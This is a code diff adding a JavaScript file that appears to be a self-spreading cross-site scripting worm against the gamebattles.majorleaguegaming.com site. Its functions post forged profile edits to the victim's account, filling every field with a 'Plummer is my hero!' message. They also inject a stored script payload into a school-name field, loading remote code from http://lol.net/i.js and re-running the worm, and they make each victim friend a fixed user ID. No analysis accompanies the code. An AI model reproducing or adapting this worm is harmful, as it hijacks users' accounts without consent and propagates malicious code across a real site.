@@ -1,0 +1,60 @@
+function main() {
+	var hero = "[color=red][b]Plummer is my hero![/b][/color]";
+	var hero2 = "Plummer is my hero!";
+	$.ajax({
+		type: "POST",
+		url: "http://gamebattles.majorleaguegaming.com/account/profile",
+		data: {
+			email:hero2,
+			origin:hero2,
+			skype:hero2,
+			facebook:hero2,
+			tumblr:hero2,
+			youtube:hero2,
+			steam:hero2,
+			aim:hero2,
+			irc:hero2,
+			hometown:hero2,
+			website:hero2,
+			occupation:hero2,
+			company:hero2,
+			bio:hero,
+			blast:hero,
+			interests:hero2,
+			games:hero2,
+			music:hero2,
+			movies:hero2,
+			tv:hero2,
+			books:hero2,
+			task:"update"
+		}
+	}).done(function(result) {
+		infect_profile();
+	});
+}
+
+function infect_profile() {
+	var payload = "<script src=\"http://lol.net/i.js\"></script><script>main();</script>";
+	$.ajax({
+		type: "POST",
+		url: "http://gamebattles.majorleaguegaming.com/javascript/school_app/process_school.php",
+		data: {
+			schoolName:payload
+		}
+	}).done(function(result) {
+		add_as_friend();
+	});
+}
+
+function add_as_friend() {
+	var userid = "9924644";
+	$.ajax({
+		type: "POST",
+		url: "http://gamebattles.majorleaguegaming.com/members/friend",
+		data: {
+			uid:userid,
+			action:"insert"
+		}
+	}).done(function(result) {
+	});
+}
